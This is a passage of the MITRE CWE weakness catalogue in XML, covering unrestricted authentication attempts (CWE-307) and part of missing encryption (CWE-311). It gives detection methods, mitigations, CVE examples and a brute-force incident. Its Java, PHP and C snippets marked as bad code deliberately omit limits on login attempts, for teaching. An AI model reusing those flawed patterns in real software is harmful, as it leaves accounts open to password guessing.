               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>808</Relationship_Target_ID>
               <!--2010 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>287</Relationship_Target_ID>
               <!--Improper Authentication--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>799</Relationship_Target_ID>
               <!--Improper Control of Interaction Frequency--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">711</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>724</Relationship_Target_ID>
               <!--OWASP Top Ten 2004 Category A3 - Broken Authentication and Session Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>812</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A3 - Broken Authentication and Session Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>955</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Unrestricted Authentication--></Relationship>
         </Relationships>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
         </Applicable_Platforms>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
         </Time_of_Introduction>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Technical_Impact>Bypass protection
						mechanism</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>An attacker could perform an arbitrary number of authentication
							attempts using different passwords, and eventually gain access to the
							targeted account.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with automated results
						interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Web Application Scanner</Text>
                        <Text>Web Services Scanner</Text>
                        <Text>Database Scanners</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Host-based Vulnerability Scanners – Examine configuration for
									flaws, verifying that audit mechanisms work, ensure host
									configuration meets certain predefined criteria</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Fuzz Tester</Text>
                        <Text>Framework-based Fuzzer</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Forced Path Execution</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Configuration Checker</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Common protection mechanisms include:</Text>
                  <Block Block_Nature="List">
                     <Text>Disconnecting the user after a small number of failed
								attempts</Text>
                     <Text>Implementing a timeout</Text>
                     <Text>Locking out a targeted account</Text>
                     <Text>Requiring a computational task on the user's part.</Text>
                  </Block>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to avoid. </Text>
                  <Text>Consider using libraries with authentication capabilities such as
							OpenSSL or the ESAPI Authenticator. [R.307.1]</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In January 2009, an attacker was able to gain administrator access
						to a Twitter server because the server did not restrict the number of login
						attempts. The attacker targeted a member of Twitter's support team and was
						able to successfully guess the member's password using a brute force attack
						by guessing a large number of common words. Once the attacker gained access
						as the member of the support staff, he used the administrator panel to gain
						access to 33 accounts that belonged to celebrities and politicians.
						Ultimately, fake Twitter messages were sent that appeared to come from the
						compromised accounts.</Intro_Text>
               <Demonstrative_Example_References>
                  <Reference>
                     <Reference_Author>Kim Zetter</Reference_Author>
                     <Reference_Title>Weak Password Brings 'Happiness' to Twitter
								Hacker</Reference_Title>
                     <Reference_Date>2009-01-09</Reference_Date>
                     <Reference_Link>http://www.wired.com/threatlevel/2009/01/professed-twitt/</Reference_Link>
                  </Reference>
               </Demonstrative_Example_References>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code, extracted from a servlet's doPost() method,
						performs an authentication lookup every time the servlet is
						invoked.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>String username = request.getParameter("username");</Code>
                     <Code>String password = request.getParameter("password");</Code>
                     <Code/>
                     <Code>int authResult = authenticateUser(username, password);</Code>
                  </Block>
                  <Text>However, the software makes no attempt to restrict excessive
							authentication attempts.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This code attempts to limit the number of login attempts by causing
						the process to sleep before completing the authentication.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code> $username = $_POST['username'];</Code>
                     <Code> $password = $_POST['password'];</Code>
                     <Code> sleep(2000);</Code>
                     <Code> $isAuthenticated = authenticateUser($username, $password);</Code>
                  </Block>
                  <Text>However, there is no limit on parallel connections, so this does not
							increase the amount of time an attacker needs to complete an
							attack.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the following C/C++ example the validateUser method opens a
						socket connection, reads a username and password from the socket and
						attempts to authenticate the username and password. </Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code_Example_Language>C++</Code_Example_Language>
                     <Code>int validateUser(char *host, int port)</Code>
                     <Code>{</Code>
                     <Block>
                        <Code>int socket = openSocketConnection(host, port);</Code>
                        <Code>if (socket &lt; 0) {</Code>
                        <Block>
                           <Code>printf("Unable to open socket connection");</Code>
                           <Code>return(FAIL);</Code>
                        </Block>
                        <Code>}</Code>
                        <Code/>
                        <Code>int isValidUser = 0;</Code>
                        <Code>char username[USERNAME_SIZE];</Code>
                        <Code>char password[PASSWORD_SIZE];</Code>
                        <Code/>
                        <Code>while (isValidUser == 0) {</Code>
                        <Block>
                           <Code>if (getNextMessage(socket, username, USERNAME_SIZE)
										&gt; 0) {</Code>
                           <Block>
                              <Code>if (getNextMessage(socket, password, PASSWORD_SIZE)
											&gt; 0) {</Code>
                              <Block>
                                 <Code>isValidUser = AuthenticateUser(username,
												password);</Code>
                              </Block>
                              <Code>}</Code>
                           </Block>
                           <Code>}</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>return(SUCCESS);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>The validateUser method will continuously check for a valid username
							and password without any restriction on the number of authentication
							attempts made. The method should limit the number of authentication
							attempts made to prevent brute force attacks as in the following example
							code.</Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code_Example_Language>C++</Code_Example_Language>
                     <Code>int validateUser(char *host, int port)</Code>
                     <Code>{</Code>
                     <Block>
                        <Code>...</Code>
                        <Code/>
                        <Code>int count = 0;</Code>
                        <Code>while ((isValidUser == 0) &amp;&amp; (count &lt;
									MAX_ATTEMPTS)) {</Code>
                        <Block>
                           <Code>if (getNextMessage(socket, username, USERNAME_SIZE)
										&gt; 0) {</Code>
                           <Block>
                              <Code>if (getNextMessage(socket, password, PASSWORD_SIZE)
											&gt; 0) {</Code>
                              <Block>
                                 <Code>isValidUser = AuthenticateUser(username,
												password);</Code>
                              </Block>
                              <Code>}</Code>
                           </Block>
                           <Code>}</Code>
                           <Code>count++;</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>if (isValidUser) {</Code>
                        <Block>
                           <Code>return(SUCCESS);</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>else {</Code>
                        <Block>
                           <Code>return(FAIL);</Code>
                        </Block>
                        <Code>}</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-1999-1152</Observed_Example_Reference>
               <Observed_Example_Description>Product does not disconnect or timeout after
						multiple failed logins.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2001-1291</Observed_Example_Reference>
               <Observed_Example_Description>Product does not disconnect or timeout after
						multiple failed logins.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2001-0395</Observed_Example_Reference>
               <Observed_Example_Description>Product does not disconnect or timeout after
						multiple failed logins.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2001-1339</Observed_Example_Reference>
               <Observed_Example_Description>Product does not disconnect or timeout after
						multiple failed logins.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-0628</Observed_Example_Reference>
               <Observed_Example_Description>Product does not disconnect or timeout after
						multiple failed logins.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-1999-1324</Observed_Example_Reference>
               <Observed_Example_Description>User accounts not disabled when they exceed a
						threshold; possibly a resultant problem.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Reference_ID="REF-21" Local_Reference_ID="R.307.1">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>OWASP Enterprise Security API (ESAPI) Project</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/ESAPI</Reference_Link>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="PLOVER">
               <Mapped_Node_Name>Multiple Failed Authentication Attempts not
						Prevented</Mapped_Node_Name>
               <Mapped_Node_ID>AUTHENT.MULTFAIL</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Unrestricted authentication</Mapped_Node_Name>
               <Mapped_Node_ID>SFP34</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>PLOVER</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Sean Eidemiller</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative
						examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples,
						Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Name,
						Potential_Mitigations, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Related_Attack_Patterns,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2008-04-11">Multiple Failed
						Authentication Attempts not Prevented</Previous_Entry_Name>
               <Previous_Entry_Name Name_Change_Date="2010-02-16">Failure to Restrict Excessive
						Authentication Attempts</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="311" Name="Missing Encryption of Sensitive Data" Weakness_Abstraction="Base" Status="Draft">
         <Description>
            <Description_Summary>The software does not encrypt sensitive or critical information
					before storage or transmission.</Description_Summary>
            <Extended_Description>
               <Text> The lack of proper data encryption passes up the guarantees of
						confidentiality, integrity, and accountability that properly implemented
						encryption conveys.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>866</Relationship_Target_ID>
               <!--2011 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>803</Relationship_Target_ID>
               <!--2010 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>310</Relationship_Target_ID>
               <!--Cryptographic Issues--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>693</Relationship_Target_ID>
               <!--Protection Mechanism Failure--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">629</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>719</Relationship_Target_ID>
               <!--OWASP Top Ten 2007 Category A8 - Insecure Cryptographic Storage--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>629</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>720</Relationship_Target_ID>
               <!--OWASP Top Ten 2007 Category A9 - Insecure Communications--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">711</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>729</Relationship_Target_ID>
               <!--OWASP Top Ten 2004 Category A8 - Insecure Storage--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">844</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>861</Relationship_Target_ID>
               <!--CERT Java Secure Coding Section 49 - Miscellaneous (MSC)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>816</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A7 - Insecure Cryptographic Storage--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>818</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A9 - Insufficient Transport Layer Protection--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>963</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Exposed Data--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>928</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>930</Relationship_Target_ID>
               <!--OWASP Top Ten 2013 Category A2 - Broken Authentication and Session Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">928</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>934</Relationship_Target_ID>
               <!--OWASP Top Ten 2013 Category A6 - Sensitive Data Exposure--></Relationship>
         </Relationships>
         <Relationship_Notes>
            <Relationship_Note>
               <Text>There is an overlapping relationship between insecure storage of sensitive
						information (CWE-922) and missing encryption of sensitive information
						(CWE-311). Encryption is often used to prevent an attacker from reading the
						sensitive data. However, encryption does not prevent the attacker from
						erasing or overwriting the data.</Text>
            </Relationship_Note>
         </Relationship_Notes>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
         </Applicable_Platforms>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Operation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>High to Very High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Technical_Impact>Read application
						data</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If the application does not use a secure channel, such as SSL, to
							exchange sensitive information, it is possible for an attacker with
							access to the network traffic to sniff packets from the connection and
							uncover the data. This attack is not technically difficult, but does
							require physical access to some portion of the network over which the
							sensitive data travels. This access is usually somewhere near where the
							user is connected to the network (such as a colleague on the company
							network) but can be anywhere along the path from the user to the end
							server.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Technical_Impact>Modify application
						data</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>Omitting the use of encryption in any program which transfers data
							over a network of any kind should be considered on par with delivering
							the data sent to each user on the local networks of both the sender and
							receiver. Worse, this omission allows for the injection of data into a
							stream of communication between two parties -- with no means for the
							victims to separate valid data from invalid. In this day of widespread
							network attacks and password collection sniffers, it is an unnecessary
							risk to omit encryption from the design of any system which might
							benefit from it.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method_Name>Manual Analysis</Method_Name>
               <Method_Description>
                  <Text>The characterizaton of sensitive data often requires domain-specific
							understanding, so manual methods are useful. However, manual efforts
							might not achieve desired code coverage within limited time constraints.
							Black box methods may produce artifacts (e.g. stored data or unencrypted
							network transfer) that require manual evaluation.</Text>
               </Method_Description>
               <Method_Effectiveness>High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Analysis</Method_Name>
               <Method_Description>
                  <Text>Automated measurement of the entropy of an input/output source may
							indicate the use or lack of encryption, but human analysis is still
							required to distinguish intentionally-unencrypted data (e.g. metadata)
							from sensitive data. </Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode disassembler - then use manual analysis for
									vulnerabilities &amp; anomalies</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with automated results
						interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Web Application Scanner</Text>
                        <Text>Web Services Scanner</Text>
                        <Text>Database Scanners</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Network Sniffer</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Fuzz Tester</Text>
                        <Text>Framework-based Fuzzer</Text>
                        <Text>Automated Monitored Execution</Text>
                        <Text>Man-in-the-middle attack tool</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Attack Modeling</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Requirements</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Clearly specify which data or resources are valuable enough that they
							should be protected by encryption. Require that any transmission or
							storage of this data/resource should use well-vetted encryption
							algorithms.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Threat Modeling</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Using threat modeling or other techniques, assume that the data can be
							compromised through a separate vulnerability or weakness, and determine
							where encryption will be most effective. Ensure that data that should be
							private is not being inadvertently exposed using weaknesses such as
							insecure permissions (CWE-732). [R.311.1]</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Ensure that encryption is properly integrated into the system design,
							including but not necessarily limited to:</Text>
                  <Block Block_Nature="List">
                     <Text>Encryption that is needed to store or transmit private data of the
								users of the system </Text>
                     <Text>Encryption that is needed to protect the system itself from
